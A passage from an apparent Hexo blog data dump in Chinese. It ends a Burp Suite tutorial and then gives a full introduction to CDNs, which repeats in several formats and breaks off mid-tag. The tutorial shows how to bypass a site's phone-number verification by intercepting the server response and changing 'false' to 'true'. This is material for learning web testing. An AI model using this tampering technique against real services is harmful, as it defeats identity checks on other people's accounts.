title=\"Burpsuite拦截\"></a>Burpsuite拦截</h3><p>1.Burpsuite默认是拦截、修改Request数据包(也可以修改其他规则拦截其他类型数据)<br><img src=\"/images/Burpsuite/bp1.png\"><br>1.1.Request拦截配置(红色标记处默认两处已选择)<br><img src=\"/images/Burpsuite/bp2.png\"><br>1.2.通过修改proxy选项，option内修改Response<br>配置勾选如下图所示，新建规则/修改之前规则也可以.<br><img src=\"/images/Burpsuite/bp3.png\"></p>\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>1.通过修改proxy选项，option内修改Response配置.<br>配置勾选如下图所示，新建规则/修改之前规则也可以.<br><img src=\"/images/Burpsuite/bp4.png\"><br>2.测试<br><img src=\"/images/Burpsuite/bp5.png\"></p>\n<center>Request请求数据包</center>\n\n<p><img src=\"/images/Burpsuite/bp6.png\"></p>\n<center>Response拦截</center> \n\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>1.正常数据包拦截<br><img src=\"/images/Burpsuite/bp7.png\"></p>\n<center>点击后即可完成此请求的服务器返回数据包拦截</center> \n\n<p>  <img src=\"/images/Burpsuite/bp8.png\"></p>\n <center>Response拦截成功</center> \n\n<h3 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h3><p>1.用户注册</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username:si1entt</span><br><span class=\"line\">passwd:si1enta123</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Burpsuite/bp9.png\"><br>2.手机号绑定<br>业务逻辑：输入正确手机号并获取验证码输入后方可验证通过<br><img src=\"/images/Burpsuite/bp10.png\"><br>3.此时我们尝试输入非使用手机号绕过验证<br>随机输入手机号、手机号验证码、以及校验码<br><img src=\"/images/Burpsuite/bp11.png\"><br><img src=\"/images/Burpsuite/bp12.png\"></p>\n<center>Response数据包获取</center> \n\n<p>4.修改response数据，false为true并重放<br><img src=\"/images/Burpsuite/bp13.png\"><br><img src=\"/images/Burpsuite/bp14.png\"><br>5.用户登陆查看数据绑定手机号信息<br><img src=\"/images/Burpsuite/bp15.png\"></p>\n<h3 id=\"结束\"><a href=\"#结束\" class=\"headerlink\" title=\"结束\"></a>结束</h3><p>Burpsuite功能点还有很多需要测试、学习.</p>\n"},{"title":"CDN学习与介绍","date":"2020-06-06T06:14:27.000Z","_content":"\nCDN 其实是 Content Delivery Network 的缩写,即“内容分发网络”源站内容(image、html、js、css等)一种合理解决因网络请求较大并自动分配因地域分开而实现的网络加速技术.\n\nCDN 诞生于二十多年前,随着骨干网压力的逐渐增大,以及长传需求的逐渐增多,使得骨干网的压力越来越大,长传效果越来越差.于是在 1995 年,MIT 的应用数学教授 Tom Leighton 带领着研究生 Danny Lewin 和其他几位顶级研究人员一起尝试用数学问题解决网络拥堵问题.\n\n他们使用数学算法,处理内容的动态路由安排,并最终解决了困扰 Internet 使用者的难题.后来,史隆管理学院的 MBA 学生 Jonathan Seelig 加入了 Leighton 的队伍中,从那以后他们开始实施自己的商业计划,最终于 1998 年 8 月 20 日正式成立公司，命名为 Akamai.\n\n同年 1998 年,中国第一家 CDN 公司 `ChinaCache`成立.\n\n```\n蓝汛 是中国第一家CDN公司\n```\n\n在接下来的20年中,CDN行业历经变革和持续发展,行业也涌现出很多云CDN厂商.阿里云CDN是2008年从淘宝CDN起家,在2014年正式发展成为阿里云CDN的,它不仅为阿里巴巴集团所有子公司提供服务,同时也将自身的资源、技术以云计算的方式输出.\n\n# 为什么有CDN\n\n当下的互联网应用都包含大量的静态内容,但静态内容以及一些准动态内容又是最耗费带宽的,特别是针对全国甚至全世界的大型网站,如果这些请求都指向主站的服务器的话,不仅是主站服务器受不了,单端口500M左右的带宽也扛不住,所以大多数网站都需要CDN服务.\n\n根本上的原因是,访问速度对互联网应用的用户体验、口碑、甚至说直接的营收都有巨大的影响,任何的企业都渴望自己站点有更快的访问速度.而HTTP传输时延对web的访问速度的影响很大,在绝大多数情况下是起决定性作用的,这是由TCP/IP协议的一些特点决定的.物理层上的原因是光速有限、信道有限,协议上的原因有丢包、慢启动、拥塞控制等.\n\n这就是你使用CDN的第一个也是最重要的原因：加速网站访问\n\n## 除网站加速外,还有其他作用\n\n- 实现跨运营商、跨地域的全网覆盖\n\n互联不互通、区域ISP地域局限、出口带宽受限制等种种因素都造成了网站的区域性无法访问.CDN加速可以覆盖全球的线路,通过和运营商合作,部署IDC资源,在全国骨干节点商,合理部署CDN边缘分发存储节点,充分利用带宽资源,平衡源站流量.阿里云在国内有500+节点,海外300+节点,覆盖主流国家和地区不是问题,可以确保CDN服务的稳定和快速.\n\n- 保障网站安全性\n\nCDN的负载均衡和分布式存储技术,可以加强网站的可靠性,相当无无形中给你的网站添加了一把保护伞,应对绝大部分的互联网攻击事件;防御系统也能避免网站遭到恶意攻击.\n\n- 异地备援\n\n当某个服务器发生意外故障时,系统将会调用其他临近的健康服务器节点进行服务,进而提供接近100%的可靠性,这就让你的网站可以做到永不宕机.\n\n- 节约成本\n\n投入使用CDN加速可以实现网站的全国铺设,你根据不用考虑购买服务器与后续的托管运维,服务器之间镜像同步,也不用为了管理维护技术人员而烦恼,节省了人力、精力和财力.\n\n- 让你更专注业务本身\n\nCDN加速厂商一般都会提供一站式服务,业务不仅限于CDN,还有配套的云存储、大数据服务、视频云服务等,而且一般会提供7x24运维监控支持,保证网络随时畅通,你可以放心使用.并且将更多的精力投入到发展自身的核心业务之上.\n\n![](/images/cdn/image-20200606144540270.png)\n\n##  原理\n\n![](/images/cdn/image-20200606150157143.png)\n\n### 通过域名解析IP分析\n\n![](/images/cdn/image-20200606160916110.png)\n\n1. 当用户请求URL,经过本地DNS系统解析，DNS 系统会最终将域名的解析权交给 [CNAME](http://en.wikipedia.org/wiki/CNAME_record) 指向的 CDN 专用 DNS 服务器.\n2. CDN 的 DNS 服务器将 CDN 的全局负载均衡设备 IP 地址返回用户.\n3. 用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求.\n4. CDN 全局负载均衡设备根据用户 IP 地址,以及用户请求的内容URL,选择一台用户所属区域的区域负载均衡设备,告诉用户向这台设备发起请求.\n5. 基于以下这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的IP地址.\n6. 根据用户 IP 地址，判断哪一台服务器距用户最近.\n7. 根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容.\n8. 查询各个服务器当前的负载情况,判断哪一台服务器尚有服务能力.\n9. 全局负载均衡设备把服务器的 IP 地址返回给用户\n10. 用户向缓存服务器发起请求,缓存服务器响应用户请求,将用户所需内容传送到用户终端.如果这台缓存服务器上并没有用户想要的内容,而区域均衡设备依然将它分配给了用户,那么这台服务器就要向它的上一级缓存服务器请求内容,直至追溯到网站的源服务器将内容拉到本地.\n\nDNS 服务器根据用户 IP 地址,将域名解析成相应节点的缓存服务器IP地址,实现用户就近访问.使用 CDN 服务的网站,只需将其域名解析权交给 CDN 的全局负载均衡（GSLB）设备,将需要分发的内容注入 CDN,就可以实现内容加速了.\n\n# 常用CDN软件\n\n- Varnish ：可以认为是内存缓存,速度一流,但是内存缓存也限制了其容量,缓存页面和图片一般是挺好的.\n- Squid：功能最全且比较传统的Web cache server,有自己的存储引擎.但是架构太老,性能一般.\n- nginx：本来是反向代理/web服务器,用了插件可以做这个副业,但是本身不支持的功能比较多(Nginx功能其实还有很多可以学习).\n- apache traffic server(ATS)：很多单位都在使用,未来趋势.\n## 各厂家使用情况\n- 网宿：使用ATS，按照网宿的规模应该是有能力进行二次开发。\n- 蓝汛：早期是squid，当其余厂商拥抱ATS时，由于技术包袱未及时投入ATS，但目前也在使用ATS\n- 小米、京东等主要使用ATS\n- 腾讯：使用ATS\n- 百度：nginx + 自研缓存\n- 阿里：tengine + 自研swift，早起使用ATS，但由于某些原因放弃ATS使用自研，不过自研可能是C开发，应该是参考哪款开源软件，比如文件系统借鉴的是squid的文件系统。\n- 又拍云：之前使用ATS，最新的消息是自研BearCache，应该不是全量部署，从文章来看猜测是优化了网络框架和热重启架构，应该也是参考ATS等。\n- 新浪：Nginx + ncache，需要第三方模块并且插件化开发，性能损失比较大\n\n# 适用场景\n\n- 应用加速\n\n静态内容加速，如：html image js css 等\n\n- 大文件下载分发加速\n\n基于视屏、MP4等大文件加速\n\n- 视频直播加速\n\n视频直播加速，流媒体切片、转码、码流转换等等\n\n- 移动应用加速\n\n移动APP更新文件（apk文件）分发,移动APP内图片、页面、短视频、UGC等内容的优化加速分发.\n\n- 抵抗DDoS\n\nCDN提供了大型分布式服务器基础结构来吸收攻击量.\n\n#  扩展\n\n### 流量劫持\n\nCDN本身就是一种DNS劫持,只不过是良性的. 不同于黑客强制DNS把域名解析到自己的钓鱼IP上,CDN则是让DNS主动配合,把域名解析到临近的服务器上.\n\n### 劫持分类\n\n- 域名劫持：又称DNS劫持,通常是指域名指向到非正常IP（恶意IP）,该恶意IP通过反向代理的方式,在能返回网页正常内容的情况,可能插入恶意代码、监听网民访问、劫持敏感信息等操作.通常验证一个域名是否被劫持的方法是PING一个域名,如果发现PING出来的IP不是您的服务器真实IP,则可以确定被劫持了（当然如果使用了云安全等安全加速平台,得到的IP为平台IP,并非劫持这里需要知道）.\n- 数据劫持：通常由电信运营商中某些员工等勾结犯罪分子,在公网中进行的数据支持插入,此类情况极隐蔽，不会改变用户域名解析IP,而是直接数据流经运营商宽带时在网页中挺入内容,此类情况,建议网页启用HTTPS加密,可以解决这一问题（`通信是加密的,运营商无法插入恶意内容`）.\n\n### 高防、流量清洗\n\nCDN 可以通过分流 ,清洗掉恶意DDSS大部分的攻击流量.\n\n# 参考\n\n```php+HTML\nhttps://zhuanlan.zhihu.com/p/113037678\n\n```\n\n","source":"_posts/CDN学习与介绍.md","raw":"---\ntitle: CDN学习与介绍\ndate: 2020-06-06 14:14:27\ntag:\n\t- CDN\n---\n\nCDN 其实是 Content Delivery Network 的缩写,即“内容分发网络”源站内容(image、html、js、css等)一种合理解决因网络请求较大并自动分配因地域分开而实现的网络加速技术.\n\nCDN 诞生于二十多年前,随着骨干网压力的逐渐增大,以及长传需求的逐渐增多,使得骨干网的压力越来越大,长传效果越来越差.于是在 1995 年,MIT 的应用数学教授 Tom Leighton 带领着研究生 Danny Lewin 和其他几位顶级研究人员一起尝试用数学问题解决网络拥堵问题.\n\n他们使用数学算法,处理内容的动态路由安排,并最终解决了困扰 Internet 使用者的难题.后来,史隆管理学院的 MBA 学生 Jonathan Seelig 加入了 Leighton 的队伍中,从那以后他们开始实施自己的商业计划,最终于 1998 年 8 月 20 日正式成立公司，命名为 Akamai.\n\n同年 1998 年,中国第一家 CDN 公司 `ChinaCache`成立.\n\n```\n蓝汛 是中国第一家CDN公司\n```\n\n在接下来的20年中,CDN行业历经变革和持续发展,行业也涌现出很多云CDN厂商.阿里云CDN是2008年从淘宝CDN起家,在2014年正式发展成为阿里云CDN的,它不仅为阿里巴巴集团所有子公司提供服务,同时也将自身的资源、技术以云计算的方式输出.\n\n# 为什么有CDN\n\n当下的互联网应用都包含大量的静态内容,但静态内容以及一些准动态内容又是最耗费带宽的,特别是针对全国甚至全世界的大型网站,如果这些请求都指向主站的服务器的话,不仅是主站服务器受不了,单端口500M左右的带宽也扛不住,所以大多数网站都需要CDN服务.\n\n根本上的原因是,访问速度对互联网应用的用户体验、口碑、甚至说直接的营收都有巨大的影响,任何的企业都渴望自己站点有更快的访问速度.而HTTP传输时延对web的访问速度的影响很大,在绝大多数情况下是起决定性作用的,这是由TCP/IP协议的一些特点决定的.物理层上的原因是光速有限、信道有限,协议上的原因有丢包、慢启动、拥塞控制等.\n\n这就是你使用CDN的第一个也是最重要的原因：加速网站访问\n\n## 除网站加速外,还有其他作用\n\n- 实现跨运营商、跨地域的全网覆盖\n\n互联不互通、区域ISP地域局限、出口带宽受限制等种种因素都造成了网站的区域性无法访问.CDN加速可以覆盖全球的线路,通过和运营商合作,部署IDC资源,在全国骨干节点商,合理部署CDN边缘分发存储节点,充分利用带宽资源,平衡源站流量.阿里云在国内有500+节点,海外300+节点,覆盖主流国家和地区不是问题,可以确保CDN服务的稳定和快速.\n\n- 保障网站安全性\n\nCDN的负载均衡和分布式存储技术,可以加强网站的可靠性,相当无无形中给你的网站添加了一把保护伞,应对绝大部分的互联网攻击事件;防御系统也能避免网站遭到恶意攻击.\n\n- 异地备援\n\n当某个服务器发生意外故障时,系统将会调用其他临近的健康服务器节点进行服务,进而提供接近100%的可靠性,这就让你的网站可以做到永不宕机.\n\n- 节约成本\n\n投入使用CDN加速可以实现网站的全国铺设,你根据不用考虑购买服务器与后续的托管运维,服务器之间镜像同步,也不用为了管理维护技术人员而烦恼,节省了人力、精力和财力.\n\n- 让你更专注业务本身\n\nCDN加速厂商一般都会提供一站式服务,业务不仅限于CDN,还有配套的云存储、大数据服务、视频云服务等,而且一般会提供7x24运维监控支持,保证网络随时畅通,你可以放心使用.并且将更多的精力投入到发展自身的核心业务之上.\n\n![](/images/cdn/image-20200606144540270.png)\n\n##  原理\n\n![](/images/cdn/image-20200606150157143.png)\n\n### 通过域名解析IP分析\n\n![](/images/cdn/image-20200606160916110.png)\n\n1. 当用户请求URL,经过本地DNS系统解析，DNS 系统会最终将域名的解析权交给 [CNAME](http://en.wikipedia.org/wiki/CNAME_record) 指向的 CDN 专用 DNS 服务器.\n2. CDN 的 DNS 服务器将 CDN 的全局负载均衡设备 IP 地址返回用户.\n3. 用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求.\n4. CDN 全局负载均衡设备根据用户 IP 地址,以及用户请求的内容URL,选择一台用户所属区域的区域负载均衡设备,告诉用户向这台设备发起请求.\n5. 基于以下这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的IP地址.\n6. 根据用户 IP 地址，判断哪一台服务器距用户最近.\n7. 根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容.\n8. 查询各个服务器当前的负载情况,判断哪一台服务器尚有服务能力.\n9. 全局负载均衡设备把服务器的 IP 地址返回给用户\n10. 用户向缓存服务器发起请求,缓存服务器响应用户请求,将用户所需内容传送到用户终端.如果这台缓存服务器上并没有用户想要的内容,而区域均衡设备依然将它分配给了用户,那么这台服务器就要向它的上一级缓存服务器请求内容,直至追溯到网站的源服务器将内容拉到本地.\n\nDNS 服务器根据用户 IP 地址,将域名解析成相应节点的缓存服务器IP地址,实现用户就近访问.使用 CDN 服务的网站,只需将其域名解析权交给 CDN 的全局负载均衡（GSLB）设备,将需要分发的内容注入 CDN,就可以实现内容加速了.\n\n# 常用CDN软件\n\n- Varnish ：可以认为是内存缓存,速度一流,但是内存缓存也限制了其容量,缓存页面和图片一般是挺好的.\n- Squid：功能最全且比较传统的Web cache server,有自己的存储引擎.但是架构太老,性能一般.\n- nginx：本来是反向代理/web服务器,用了插件可以做这个副业,但是本身不支持的功能比较多(Nginx功能其实还有很多可以学习).\n- apache traffic server(ATS)：很多单位都在使用,未来趋势.\n## 各厂家使用情况\n- 网宿：使用ATS，按照网宿的规模应该是有能力进行二次开发。\n- 蓝汛：早期是squid，当其余厂商拥抱ATS时，由于技术包袱未及时投入ATS，但目前也在使用ATS\n- 小米、京东等主要使用ATS\n- 腾讯：使用ATS\n- 百度：nginx + 自研缓存\n- 阿里：tengine + 自研swift，早起使用ATS，但由于某些原因放弃ATS使用自研，不过自研可能是C开发，应该是参考哪款开源软件，比如文件系统借鉴的是squid的文件系统。\n- 又拍云：之前使用ATS，最新的消息是自研BearCache，应该不是全量部署，从文章来看猜测是优化了网络框架和热重启架构，应该也是参考ATS等。\n- 新浪：Nginx + ncache，需要第三方模块并且插件化开发，性能损失比较大\n\n# 适用场景\n\n- 应用加速\n\n静态内容加速，如：html image js css 等\n\n- 大文件下载分发加速\n\n基于视屏、MP4等大文件加速\n\n- 视频直播加速\n\n视频直播加速，流媒体切片、转码、码流转换等等\n\n- 移动应用加速\n\n移动APP更新文件（apk文件）分发,移动APP内图片、页面、短视频、UGC等内容的优化加速分发.\n\n- 抵抗DDoS\n\nCDN提供了大型分布式服务器基础结构来吸收攻击量.\n\n#  扩展\n\n### 流量劫持\n\nCDN本身就是一种DNS劫持,只不过是良性的. 不同于黑客强制DNS把域名解析到自己的钓鱼IP上,CDN则是让DNS主动配合,把域名解析到临近的服务器上.\n\n### 劫持分类\n\n- 域名劫持：又称DNS劫持,通常是指域名指向到非正常IP（恶意IP）,该恶意IP通过反向代理的方式,在能返回网页正常内容的情况,可能插入恶意代码、监听网民访问、劫持敏感信息等操作.通常验证一个域名是否被劫持的方法是PING一个域名,如果发现PING出来的IP不是您的服务器真实IP,则可以确定被劫持了（当然如果使用了云安全等安全加速平台,得到的IP为平台IP,并非劫持这里需要知道）.\n- 数据劫持：通常由电信运营商中某些员工等勾结犯罪分子,在公网中进行的数据支持插入,此类情况极隐蔽，不会改变用户域名解析IP,而是直接数据流经运营商宽带时在网页中挺入内容,此类情况,建议网页启用HTTPS加密,可以解决这一问题（`通信是加密的,运营商无法插入恶意内容`）.\n\n### 高防、流量清洗\n\nCDN 可以通过分流 ,清洗掉恶意DDSS大部分的攻击流量.\n\n# 参考\n\n```php+HTML\nhttps://zhuanlan.zhihu.com/p/113037678\n\n```\n\n","slug":"CDN学习与介绍","published":1,"updated":"2020-10-23T04:26:34.118Z","_id":"ckglobhdd0003b1hqbxg66l2x","comments":1,"layout":"post","photos":[],"link":"","content":"<p>CDN 其实是 Content Delivery Network 的缩写,即“内容分发网络”源站内容(image、html、js、css等)一种合理解决因网络请求较大并自动分配因地域分开而实现的网络加速技术.</p>\n<p>CDN 诞生于二十多年前,随着骨干网压力的逐渐增大,以及长传需求的逐渐增多,使得骨干网的压力越来越大,长传效果越来越差.于是在 1995 年,MIT 的应用数学教授 Tom Leighton 带领着研究生 Danny Lewin 和其他几位顶级研究人员一起尝试用数学问题解决网络拥堵问题.</p>\n<p>他们使用数学算法,处理内容的动态路由安排,并最终解决了困扰 Internet 使用者的难题.后来,史隆管理学院的 MBA 学生 Jonathan Seelig 加入了 Leighton 的队伍中,从那以后他们开始实施自己的商业计划,最终于 1998 年 8 月 20 日正式成立公司，命名为 Akamai.</p>\n<p>同年 1998 年,中国第一家 CDN 公司 <code>ChinaCache</code>成立.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">蓝汛 是中国第一家CDN公司</span><br></pre></td></tr></table></figure>\n\n<p>在接下来的20年中,CDN行业历经变革和持续发展,行业也涌现出很多云CDN厂商.阿里云CDN是2008年从淘宝CDN起家,在2014年正式发展成为阿里云CDN的,它不仅为阿里巴巴集团所有子公司提供服务,同时也将自身的资源、技术以云计算的方式输出.</p>\n<h1 id=\"为什么有CDN\"><a href=\"#为什么有CDN\" class=\"headerlink\" title=\"为什么有CDN\"></a>为什么有CDN</h1><p>当下的互联网应用都包含大量的静态内容,但静态内容以及一些准动态内容又是最耗费带宽的,特别是针对全国甚至全世界的大型网站,如果这些请求都指向主站的服务器的话,不仅是主站服务器受不了,单端口500M左右的带宽也扛不住,所以大多数网站都需要CDN服务.</p>\n<p>根本上的原因是,访问速度对互联网应用的用户体验、口碑、甚至说直接的营收都有巨大的影响,任何的企业都渴望自己站点有更快的访问速度.而HTTP传输时延对web的访问速度的影响很大,在绝大多数情况下是起决定性作用的,这是由TCP/IP协议的一些特点决定的.物理层上的原因是光速有限、信道有限,协议上的原因有丢包、慢启动、拥塞控制等.</p>\n<p>这就是你使用CDN的第一个也是最重要的原因：加速网站访问</p>\n<h2 id=\"除网站加速外-还有其他作用\"><a href=\"#除网站加速外-还有其他作用\" class=\"headerlink\" title=\"除网站加速外,还有其他作用\"></a>除网站加速外,还有其他作用</h2><ul>\n<li>实现跨运营商、跨地域的全网覆盖</li>\n</ul>\n<p>互联不互通、区域ISP地域局限、出口带宽受限制等种种因素都造成了网站的区域性无法访问.CDN加速可以覆盖全球的线路,通过和运营商合作,部署IDC资源,在全国骨干节点商,合理部署CDN边缘分发存储节点,充分利用带宽资源,平衡源站流量.阿里云在国内有500+节点,海外300+节点,覆盖主流国家和地区不是问题,可以确保CDN服务的稳定和快速.</p>\n<ul>\n<li>保障网站安全性</li>\n</ul>\n<p>CDN的负载均衡和分布式存储技术,可以加强网站的可靠性,相当无无形中给你的网站添加了一把保护伞,应对绝大部分的互联网攻击事件;防御系统也能避免网站遭到恶意攻击.</p>\n<ul>\n<li>异地备援</li>\n</ul>\n<p>当某个服务器发生意外故障时,系统将会调用其他临近的健康服务器节点进行服务,进而提供接近100%的可靠性,这就让你的网站可以做到永不宕机.</p>\n<ul>\n<li>节约成本</li>\n</ul>\n<p>投入使用CDN加速可以实现网站的全国铺设,你根据不用考虑购买服务器与后续的托管运维,服务器之间镜像同步,也不用为了管理维护技术人员而烦恼,节省了人力、精力和财力.</p>\n<ul>\n<li>让你更专注业务本身</li>\n</ul>\n<p>CDN加速厂商一般都会提供一站式服务,业务不仅限于CDN,还有配套的云存储、大数据服务、视频云服务等,而且一般会提供7x24运维监控支持,保证网络随时畅通,你可以放心使用.并且将更多的精力投入到发展自身的核心业务之上.</p>\n<p><img src=\"/images/cdn/image-20200606144540270.png\"></p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\" 原理\"></a> 原理</h2><p><img src=\"/images/cdn/image-20200606150157143.png\"></p>\n<h3 id=\"通过域名解析IP分析\"><a href=\"#通过域名解析IP分析\" class=\"headerlink\" title=\"通过域名解析IP分析\"></a>通过域名解析IP分析</h3><p><img src=\"/images/cdn/image-20200606160916110.png\"></p>\n<ol>\n<li>当用户请求URL,经过本地DNS系统解析，DNS 系统会最终将域名的解析权交给 <a href=\"http://en.wikipedia.org/wiki/CNAME_record\">CNAME</a> 指向的 CDN 专用 DNS 服务器.</li>\n<li>CDN 的 DNS 服务器将 CDN 的全局负载均衡设备 IP 地址返回用户.</li>\n<li>用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求.</li>\n<li>CDN 全局负载均衡设备根据用户 IP 地址,以及用户请求的内容URL,选择一台用户所属区域的区域负载均衡设备,告诉用户向这台设备发起请求.</li>\n<li>基于以下这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的IP地址.</li>\n<li>根据用户 IP 地址，判断哪一台服务器距用户最近.</li>\n<li>根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容.</li>\n<li>查询各个服务器当前的负载情况,判断哪一台服务器尚有服务能力.</li>\n<li>全局负载均衡设备把服务器的 IP 地址返回给用户</li>\n<li>用户向缓存服务器发起请求,缓存服务器响应用户请求,将用户所需内容传送到用户终端.如果这台缓存服务器上并没有用户想要的内容,而区域均衡设备依然将它分配给了用户,那么这台服务器就要向它的上一级缓存服务器请求内容,直至追溯到网站的源服务器将内容拉到本地.</li>\n</ol>\n<p>DNS 服务器根据用户 IP 地址,将域名解析成相应节点的缓存服务器IP地址,实现用户就近访问.使用 CDN 服务的网站,只需将其域名解析权交给 CDN 的全局负载均衡（GSLB）设备,将需要分发的内容注入 CDN,就可以实现内容加速了.</p>\n<h1 id=\"常用CDN软件\"><a href=\"#常用CDN软件\" class=\"headerlink\" title=\"常用CDN软件\"></a>常用CDN软件</h1><ul>\n<li>Varnish ：可以认为是内存缓存,速度一流,但是内存缓存也限制了其容量,缓存页面和图片一般是挺好的.</li>\n<li>Squid：功能最全且比较传统的Web cache server,有自己的存储引擎.但是架构太老,性能一般.</li>\n<li>nginx：本来是反向代理/web服务器,用了插件可以做这个副业,但是本身不支持的功能比较多(Nginx功能其实还有很多可以学习).</li>\n<li>apache traffic server(ATS)：很多单位都在使用,未来趋势.<h2 id=\"各厂家使用情况\"><a href=\"#各厂家使用情况\" class=\"headerlink\" title=\"各厂家使用情况\"></a>各厂家使用情况</h2></li>\n<li>网宿：使用ATS，按照网宿的规模应该是有能力进行二次开发。</li>\n<li>蓝汛：早期是squid，当其余厂商拥抱ATS时，由于技术包袱未及时投入ATS，但目前也在使用ATS</li>\n<li>小米、京东等主要使用ATS</li>\n<li>腾讯：使用ATS</li>\n<li>百度：nginx + 自研缓存</li>\n<li>阿里：tengine + 自研swift，早起使用ATS，但由于某些原因放弃ATS使用自研，不过自研可能是C开发，应该是参考哪款开源软件，比如文件系统借鉴的是squid的文件系统。</li>\n<li>又拍云：之前使用ATS，最新的消息是自研BearCache，应该不是全量部署，从文章来看猜测是优化了网络框架和热重启架构，应该也是参考ATS等。</li>\n<li>新浪：Nginx + ncache，需要第三方模块并且插件化开发，性能损失比较大</li>\n</ul>\n<h1 id=\"适用场景\"><a href=\"#适用场景\" class=\"headerlink\" title=\"适用场景\"></a>适用场景</h1><ul>\n<li>应用加速</li>\n</ul>\n<p>静态内容加速，如：html image js css 等</p>\n<ul>\n<li>大文件下载分发加速</li>\n</ul>\n<p>基于视屏、MP4等大文件加速</p>\n<ul>\n<li>视频直播加速</li>\n</ul>\n<p>视频直播加速，流媒体切片、转码、码流转换等等</p>\n<ul>\n<li>移动应用加速</li>\n</ul>\n<p>移动APP更新文件（apk文件）分发,移动APP内图片、页面、短视频、UGC等内容的优化加速分发.</p>\n<ul>\n<li>抵抗DDoS</li>\n</ul>\n<p>CDN提供了大型分布式服务器基础结构来吸收攻击量.</p>\n<h1 id=\"扩展\"><a href=\"#扩展\" class=\"headerlink\" title=\" 扩展\"></a> 扩展</h1><h3 id=\"流量劫持\"><a href=\"#流量劫持\" class=\"headerlink\" title=\"流量劫持\"></a>流量劫持</h3><p>CDN本身就是一种DNS劫持,只不过是良性的. 不同于黑客强制DNS把域名解析到自己的钓鱼IP上,CDN则是让DNS主动配合,把域名解析到临近的服务器上.</p>\n<h3 id=\"劫持分类\"><a href=\"#劫持分类\" class=\"headerlink\" title=\"劫持分类\"></a>劫持分类</h3><ul>\n<li>域名劫持：又称DNS劫持,通常是指域名指向到非正常IP（恶意IP）,该恶意IP通过反向代理的方式,在能返回网页正常内容的情况,可能插入恶意代码、监听网民访问、劫持敏感信息等操作.通常验证一个域名是否被劫持的方法是PING一个域名,如果发现PING出来的IP不是您的服务器真实IP,则可以确定被劫持了（当然如果使用了云安全等安全加速平台,得到的IP为平台IP,并非劫持这里需要知道）.</li>\n<li>数据劫持：通常由电信运营商中某些员工等勾结犯罪分子,在公网中进行的数据支持插入,此类情况极隐蔽，不会改变用户域名解析IP,而是直接数据流经运营商宽带时在网页中挺入内容,此类情况,建议网页启用HTTPS加密,可以解决这一问题（<code>通信是加密的,运营商无法插入恶意内容</code>）.</li>\n</ul>\n<h3 id=\"高防、流量清洗\"><a href=\"#高防、流量清洗\" class=\"headerlink\" title=\"高防、流量清洗\"></a>高防、流量清洗</h3><p>CDN 可以通过分流 ,清洗掉恶意DDSS大部分的攻击流量.</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;113037678</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>CDN 其实是 Content Delivery Network 的缩写,即“内容分发网络”源站内容(image、html、js、css等)一种合理解决因网络请求较大并自动分配因地域分开而实现的网络加速技术.</p>\n<p>CDN 诞生于二十多年前,随着骨干网压力的逐渐增大,以及长传需求的逐渐增多,使得骨干网的压力越来越大,长传效果越来越差.于是在 1995 年,MIT 的应用数学教授 Tom Leighton 带领着研究生 Danny Lewin 和其他几位顶级研究人员一起尝试用数学问题解决网络拥堵问题.</p>\n<p>他们使用数学算法,处理内容的动态路由安排,并最终解决了困扰 Internet 使用者的难题.后来,史隆管理学院的 MBA 学生 Jonathan Seelig 加入了 Leighton 的队伍中,从那以后他们开始实施自己的商业计划,最终于 1998 年 8 月 20 日正式成立公司，命名为 Akamai.</p>\n<p>同年 1998 年,中国第一家 CDN 公司 <code>ChinaCache</code>成立.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">蓝汛 是中国第一家CDN公司</span><br></pre></td></tr></table></figure>\n\n<p>在接下来的20年中,CDN行业历经变革和持续发展,行业也涌现出很多云CDN厂商.阿里云CDN是2008年从淘宝CDN起家,在2014年正式发展成为阿里云CDN的,它不仅为阿里巴巴集团所有子公司提供服务,同时也将自身的资源、技术以云计算的方式输出.</p>\n<h1 id=\"为什么有CDN\"><a href=\"#为什么有CDN\" class=\"headerlink\" title=\"为什么有CDN\"></a>为什么有CDN</h1><p>当下的互联网应用都包含大量的静态内容,但静态内容以及一些准动态内容又是最耗费带宽的,特别是针对全国甚至全世界的大型网站,如果这些请求都指向主站的服务器的话,不仅是主站服务器受不了,单端口500M左右的带宽也扛不住,所以大多数网站都需要CDN服务.</p>\n<p>根本上的原因是,访问速度对互联网应用的用户体验、口碑、甚至说直接的营收都有巨大的影响,任何的企业都渴望自己站点有更快的访问速度.而HTTP传输时延对web的访问速度的影响很大,在绝大多数情况下是起决定性作用的,这是由TCP/IP协议的一些特点决定的.物理层上的原因是光速有限、信道有限,协议上的原因有丢包、慢启动、拥塞控制等.</p>\n<p>这就是你使用CDN的第一个也是最重要的原因：加速网站访问</p>\n<h2 id=\"除网站加速外-还有其他作用\"><a 